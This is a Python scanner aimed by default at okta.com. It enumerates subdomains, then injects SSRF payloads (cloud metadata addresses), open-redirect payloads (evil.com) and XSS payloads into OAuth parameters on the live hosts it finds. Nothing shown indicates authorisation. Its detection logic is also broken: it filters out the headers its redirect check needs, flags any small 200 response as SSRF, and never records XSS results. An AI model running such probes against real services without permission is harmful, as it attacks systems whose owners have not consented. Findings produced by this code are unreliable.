#!/usr/bin/env python3
"""
okta-probe.py â€” Comprehensive subdomain enumeration + vulnerability probing for OKTA.
Free, zero API keys. Uses Certificate Transparency, DNS, and HTTP probing.

Usage:
    python okta-probe.py                    # full scan
    python okta-probe.py --subdomains-only  # just enumerate
    python okta-probe.py --urls-only        # just probe
"""
import argparse
import asyncio
import concurrent.futures
import csv
import json
import re
import socket
import sys
import time
from dataclasses import dataclass, field, asdict
from typing import Optional

# â”€â”€ DNS resolution â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
DNS_RESOLVERS = [
    ("1.1.1.1", 53),    # Cloudflare
    ("8.8.8.8", 53),    # Google
    ("9.9.9.9", 53),    # Quad9
]

def resolve_hostname(hostname: str, timeout=3) -> Optional[str]:
    """Return first resolving IPv4 or None."""
    try:
        return socket.gethostbyname_ex(hostname)[2][0]
    except OSError:
        return None

def parallel_resolve(hostnames: list[str], max_workers=50) -> dict[str, str]:
    """Resolve many hostnames in parallel, return {hostname: ip} dict."""
    results = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as ex:
        futs = {ex.submit(resolve_hostname, h): h for h in hostnames}
        for fut in concurrent.futures.as_completed(futs, timeout=30):
            h = futs[fut]
            ip = fut.result()
            if ip:
                results[h] = ip
    return results

# â”€â”€ Certificate Transparency (crt.sh) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async def ct_subdomains(domain: str) -> set[str]:
    """Fetch subdomains from Certificate Transparency logs via crt.sh."""
    import urllib.request
    subdomains = set()
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    try:
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=20) as resp:
            data = json.loads(resp.read())
            for entry in data:
                name = entry.get("name_value", "")
                for sub in name.split("\n"):
                    sub = sub.strip().lower()
                    if sub.endswith(f".{domain}") or sub == domain:
                        # Remove wildcard prefix
                        sub = sub.lstrip("*.")
                        if sub and not any(pk in sub for pk in ["/", " ", "@"]):
                            subdomains.add(sub)
    except Exception as e:
        print(f"  [!] crt.sh error: {e}", file=sys.stderr)
    return subdomains

# â”€â”€ DNS bruteforce with wordlist â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
COMMON_SUBDOMAINS = [
    "www", "api", "dev", "test", "staging", "prod", "login", "accounts",
    "auth", "sso", "idp", "portal", "admin", "manage", "dashboard", "console",
    "kmq", "clients", "preview", "developer", "goto", "mobile", "m",
    "graph", "oauth", "openid", "oidc", "v1", "v2", "v3", "cdn",
    "assets", "static", "media", "img", "images", "css", "js", "fonts",
    "mail", "smtp", "pop", "imap", "mx", "dns", "ns1", "ns2",
    "ftp", "sftp", "ssh", "git", "gitlab", "github", "jenkins", "ci",
    "db", "database", "mysql", "postgres", "redis", "mongo", "elastic",
    "rabbitmq", "kafka", "grpc", "websocket", "ws", "wss",
    "internal", "intranet", "extranet", "vpn", "proxy", "gateway",
    "notify", "notification", "push", "email", "webmail", "owa",
    "status", "health", "monitor", "metrics", "prometheus", "grafana",
    "vault", "secrets", "pki", "cert", "ssl", "tls",
    "demo", "sandbox", "lab", "research", "backup", "dr", "snapshot",
    "okta", "okta-cx", "oktaedu", "okta-partner", "okta-customer",
]

def dns_bruteforce(domain: str, max_workers=100) -> set[str]:
    """Bruteforce common subdomains via DNS resolution."""
    found = set()
    targets = [f"{sub}.{domain}" for sub in COMMON_SUBDOMAINS]

    print(f"  [*] DNS bruteforce: {len(targets)} prefixes", file=sys.stderr)
    resolved = parallel_resolve(targets, max_workers=max_workers)
    for h, ip in resolved.items():
        if ip:
            found.add(h)
            print(f"  [+] {h} â†’ {ip}")

    return found

# â”€â”€ Passive sources via httpx-style probing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async def check_url(url: str, timeout=5) -> Optional[dict]:
    """Check URL returns 200 and extract server headers."""
    import urllib.request
    try:
        req = urllib.request.Request(url, method="GET", headers={
            "User-Agent": "Mozilla/5.0 (compatible; OktaProbe/1.0)",
            "Accept": "text/html,application/xhtml+xml",
        })
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            status = resp.status
            headers = dict(resp.headers)
            server = headers.get("Server", "unknown")
            content_type = headers.get("Content-Type", "")
            body_len = int(headers.get("Content-Length", 0))
            return {
                "url": url,
                "status": status,
                "server": server,
                "content_type": content_type,
                "body_len": body_len,
                "headers": {k: v for k, v in headers.items() if k.lower() in [
                    "server", "x-okta", "x-frame-options", "x-xss-protection",
                    "content-security-policy", "strict-transport-security",
                    "access-control-allow-origin", "www-authenticate",
                ]},
            }
    except Exception:
        return None

async def probe_urls(urls: list[str], max_concurrent=30) -> list[dict]:
    """Check many URLs concurrently."""
    semaphore = asyncio.Semaphore(max_concurrent)

    async def sem_check(url):
        async with semaphore:
            return await check_url(url)

    tasks = [sem_check(u) for u in urls]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    return [r for r in results if r and not isinstance(r, Exception)]

# â”€â”€ Vulnerability probing â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
@dataclass
class Finding:
    type: str
    severity: str       # CRITICAL / HIGH / MEDIUM / LOW / INFO
    url: str
    description: str
    evidence: str
    cvss: float = 0.0
    references: list[str] = field(default_factory=list)
    tool: str = "okta-probe"

CRITICAL_PAYLOADS = {
    "ssrf": [
        "http://localhost/",
        "http://127.0.0.1/",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/",
        "http://169.254.169.254/metadata/v1/",
        "http://internal/",
        "http://insecure.internal/",
    ],
    "open_redirect": [
        "https://google.com",
        "https://evil.com",
        "https://evil.com/?x=",
    ],
    "xss": [
        "<script>alert(1)</script>",
        "javascript:alert(1)",
    ],
}

# Parameters known to be relevant to SSO/OAuth flows
OAUTH_PARAMS = [
    "redirect_uri", "client_id", "response_type", "scope",
    "state", "nonce", "prompt", "idp_hint",
    "session_token", "otp", "check_account",
]

SENSITIVE_PARAMS = [
    "token", "access_token", "refresh_token", "id_token", "code",
    "secret", "password", "new_password", "old_password",
    "pin", "otp", "mfa", "totp", "backup_code",
    "session", "session_id", "session_token",
    "jwt", "assertion", "saml", "saml_response",
    "private", "key", "cert", "credential",
]

async def probe_vulnerability(base_url: str, vuln_type: str, payloads: list[str], params: list[str], timeout=5) -> list[Finding]:
    """Generic vulnerability probe: inject payloads into URL params and observe response."""
    findings = []
    import urllib.parse

    for param in params:
        for payload in payloads:
            test_url = f"{base_url}{'?' if '?' not in base_url else '&'}{urllib.parse.quote(param, safe='')}={urllib.parse.quote(payload, safe='')}"
            result = await check_url(test_url, timeout=timeout)
            if not result:
                continue

            # SSRF detection: internal host resolves or gets special response
            if vuln_type == "ssrf":
                evidence = check_ssrf(result, payload)
                if evidence:
                    findings.append(Finding(
                        type="ssrf",
                        severity="HIGH",
                        url=test_url,
                        description=f"SSRF via parameter '{param}' â€” payload targeted internal resource",
                        evidence=evidence,
                        cvss=8.6,
                        references=[
                            "https://portswigger.net/web-security/ssrf",
                            "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html",
                        ]
                    ))

            # Open redirect detection
            elif vuln_type == "open_redirect":
                evidence = check_open_redirect(result, payload)
                if evidence:
                    findings.append(Finding(
                        type="open_redirect",
                        severity="MEDIUM",
                        url=base_url,
                        description=f"Open redirect via parameter '{param}' â€” payload {payload}",
                        evidence=evidence,
                        cvss=6.1,
                        references=["https://portswigger.net/web-security/open-redirect"]
                    ))

    return findings

def check_ssrf(result: dict, payload: str) -> Optional[str]:
    """Detect SSRF from HTTP response characteristics."""
    if result["status"] in [200, 301, 302, 307, 308]:
        # Check if payload appears in response headers (leaked data)
        headers_str = json.dumps(result.get("headers", {}))
        # Check for internal hostname resolution
        if any(x in payload for x in ["localhost", "127.0.0.1", "169.254", "metadata.google"]):
            if result["status"] != 400 and result["status"] != 404:
                return f"Payload: {payload} | Response: {result['status']} from potential internal resource"
        # Check response body for SSRF leak
        if result.get("body_len", 0) < 500 and result["status"] == 200:
            # Small response could indicate internal service responding
            return f"Payload: {payload} | Status: {result['status']} | Server: {result.get('server','?')}"
    return None

def check_open_redirect(result: dict, payload: str) -> Optional[str]:
    """Detect open redirect from response headers."""
    location = result.get("headers", {}).get("Location", "") or result.get("headers", {}).get("location", "")
    if location:
        if payload in location or payload.lower() in location.lower():
            return f"Redirect to: {location}"
    # Check Set-Cookie domain
    set_cookie = result.get("headers", {}).get("Set-Cookie", "")
    if set_cookie and ("Domain=" in set_cookie or "domain=" in set_cookie):
        return f"Set-Cookie with Domain: {set_cookie[:100]}"
    return None

# â”€â”€ SAML scanner â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async def check_saml(base_url: str) -> list[Finding]:
    """Check for SAML endpoints and common misconfigs."""
    findings = []
    import urllib.parse

    saml_paths = [
        "/saml2/", "/saml/", "/sso/saml", "/idp/saml2",
        "/oauth2/saml", "/app/saml", "/saml2/sso", "/saml2/idp",
    ]

    for path in saml_paths:
        url = base_url.rstrip("/") + path
        result = await check_url(url, timeout=5)
        if result and result["status"] in [200, 401, 403]:
            findings.append(Finding(
                type="saml_endpoint",
                severity="INFO",
                url=url,
                description=f"SAML endpoint discovered",
                evidence=f"Status: {result['status']}, Server: {result.get('server','?')}",
                cvss=0.0,
                references=["https://portswigger.net/web-security/ssrf"]
            ))

    return findings

# â”€â”€ OAuth 2.0 / OIDC discovery â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async def check_oauth_oidc(base_url: str) -> list[Finding]:
    """Discover OAuth 2.0 and OIDC endpoints."""
    findings = []
    import urllib.parse

    oauth_paths = [
        "/.well-known/openid-configuration",
        "/.well-known/oauth-authorization-server",
        "/oauth2/v1/authorize",
        "/oauth2/v2.0/authorize",
        "/oauth2/token",
        "/oauth2/introspect",
        "/oauth2/keys",
        "/oidc/v1/userinfo",
        "/oidc/v1/token",
        "/oidc/v1/logout",
        "/idp/.well-known/openid-configuration",
        "/idp/oauth2/v1/authorize",
    ]

    for path in oauth_paths:
        url = base_url.rstrip("/") + path
        result = await check_url(url, timeout=5)
        if result and result["status"] == 200:
            findings.append(Finding(
                type="oauth_oidc_endpoint",
                severity="INFO",
                url=url,
                description=f"OAuth/OIDC endpoint discovered",
                evidence=f"Content-Type: {result.get('content_type','?')}, Len: {result.get('body_len','?')}",
                cvss=0.0,
            ))

    return findings

# â”€â”€ Security header scanner â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async def check_security_headers(base_url: str) -> list[Finding]:
    """Check for missing security headers."""
    findings = []
    result = await check_url(base_url, timeout=5)
    if not result:
        return findings

    headers = result.get("headers", {})
    missing = []

    checks = {
        "Strict-Transport-Security": "HSTS not enforced â€” SSL stripping possible",
        "Content-Security-Policy": "CSP not set â€” XSS/data injection risk",
        "X-Frame-Options": "Clickjacking possible â€” X-Frame-Options missing",
        "X-Content-Type-Options": "MIME sniffing possible",
        "X-XSS-Protection": "XSS filter deprecated but header missing",
    }

    for header, desc in checks.items():
        if header.lower() not in [h.lower() for h in headers.keys()]:
            missing.append(f"{header}: {desc}")

    if missing:
        findings.append(Finding(
            type="security_headers_missing",
            severity="INFO",
            url=base_url,
            description="Security headers missing",
            evidence=" | ".join(missing),
            cvss=0.0,
        ))

    return findings

# â”€â”€ Main scan â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
async def main():
    parser = argparse.ArgumentParser(description="OKTA comprehensive subdomain + vuln probe")
    parser.add_argument("--domain", default="okta.com", help="Target domain")
    parser.add_argument("--output", default="okta-probe-report.json", help="Output JSON file")
    parser.add_argument("--subdomains-only", action="store_true")
    parser.add_argument("--urls-only", action="store_true")
    parser.add_argument("--max-workers", type=int, default=50)
    args = parser.parse_args()

    domain = args.domain
    all_subdomains: set[str] = set()
    all_urls: list[str] = []
    all_findings: list[Finding] = []

    # Step 1: Certificate Transparency
    if not args.urls_only:
        print(f"\n[*] Certificate Transparency enumeration for {domain}...")
        ct = await ct_subdomains(domain)
        print(f"  [*] Found {len(ct)} subdomains from CT logs")
        all_subdomains.update(ct)

    # Step 2: DNS bruteforce
    if not args.urls_only:
        print(f"\n[*] DNS bruteforce...")
        bruteforced = dns_bruteforce(domain, max_workers=args.max_workers)
        all_subdomains.update(bruteforced)

    # Step 3: Resolve all discovered subdomains
    print(f"\n[*] Resolving {len(all_subdomains)} candidates...")
    resolved = parallel_resolve(list(all_subdomains), max_workers=args.max_workers)
    live_hosts = list(resolved.keys())
    print(f"  [*] {len(live_hosts)} resolved ({len(resolved)} with IPs)")

    # Step 4: Build URL list (HTTPS only)
    for host in live_hosts:
        all_urls.append(f"https://{host}")

    # Step 5: HTTP probing
    if not args.subdomains_only:
        print(f"\n[*] HTTP probing {len(all_urls)} URLs...")
        probe_results = await probe_urls(all_urls[:200], max_concurrent=30)  # cap at 200 for time
        print(f"  [*] {len(probe_results)} returned HTTP responses")

        # Step 6: Vulnerability scanning on each responding host
        for r in probe_results:
            url = r["url"]
            host = url.split("://")[1].split("/")[0]
            print(f"  [*] Probing vulnerabilities at {host} ({r['status']})", file=sys.stderr)

            # Security headers
            sec = await check_security_headers(url)
            all_findings.extend(sec)

            # OAuth/OIDC endpoints
            oauth = await check_oauth_oidc(url)
            all_findings.extend(oauth)

            # SAML endpoints
            saml = await check_saml(url)
            all_findings.extend(saml)

            # SSRF in OAuth params
            ssrf = await probe_vulnerability(url, "ssrf", CRITICAL_PAYLOADS["ssrf"], OAUTH_PARAMS)
            all_findings.extend(ssrf)

            # Open redirect in OAuth params
            redirect = await probe_vulnerability(url, "open_redirect", CRITICAL_PAYLOADS["open_redirect"], OAUTH_PARAMS)
            all_findings.extend(redirect)

            # XSS in any query params
            xss = await probe_vulnerability(url, "xss", CRITICAL_PAYLOADS["xss"], OAUTH_PARAMS)
            all_findings.extend(xss)

    # Step 7: Deduplicate findings by (type, url)
    seen = set()
    deduped = []
    for f in all_findings:
        key = (f.type, f.url)
        if key not in seen:
            seen.add(key)
            deduped.append(f)

    # Sort by severity
    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    deduped.sort(key=lambda x: (sev_order.get(x.severity, 5), x.url))

    # Step 8: Output
    report = {
        "domain": domain,
        "scan_at": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "summary": {
            "total_subdomains_found": len(all_subdomains),
            "live_hosts": len(live_hosts),
            "urls_probed": len(all_urls),
            "total_findings": len(deduped),
            "by_severity": {
                sev: len([f for f in deduped if f.severity == sev])
                for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]
            }
        },
        "live_hosts": live_hosts,
        "findings": [asdict(f) for f in deduped],
    }

    with open(args.output, "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2)

    # Markdown table output
    md_lines = [
        f"# OKTA Probe Report â€” {domain}",
        f"Scan: {report['scan_at']}",
        f"",
        f"## Summary",
        f"- Subdomains found: {report['summary']['total_subdomains_found']}",
        f"- Live hosts: {report['summary']['live_hosts']}",
        f"- URLs probed: {report['summary']['urls_probed']}",
        f"- Findings: {report['summary']['total_findings']}",
        f"",
        f"## Findings by Severity",
        f"| Severity | Count |",
        f"| --- | --- |",
    ]
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        count = report['summary']['by_severity'].get(sev, 0)
        md_lines.append(f"| {sev} | {count} |")
    md_lines.append("")

    if deduped:
        md_lines += [
            "## Detailed Findings",
            "",
            "| # | Severity | Type | URL | Description |",
            "| --- | --- | --- | --- | --- |",
        ]
        for i, f in enumerate(deduped, 1):
            url_short = f.url if len(f.url) <= 60 else f.url[:60] + "â€¦"
            md_lines.append(f"| {i} | {f.severity} | {f.type} | `{url_short}` | {f.description[:80]} |")
        md_lines.append("")
        md_lines.append("### Evidence")
        for f in deduped:
            md_lines.append(f"**[{f.severity}] {f.type}** at `{f.url}`")
            md_lines.append(f"- Evidence: {f.evidence}")
            if f.references:
                md_lines.append(f"- Refs: {', '.join(f.references)}")
            md_lines.append("")

    md_path = args.output.replace(".json", ".md")
    with open(md_path, "w", encoding="utf-8") as f:
        f.write("\n".join(md_lines))

    print(f"\n[+] Report saved:")
    print(f"    JSON: {args.output}")
    print(f"    MarkDown: {md_path}")
    print(f"\n[+] Findings: {len(deduped)}")
    for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
        count = report['summary']['by_severity'].get(sev, 0)
        if count > 0:
            print(f"    {sev}: {count}")

if __name__ == "__main__":
    asyncio.run(main())
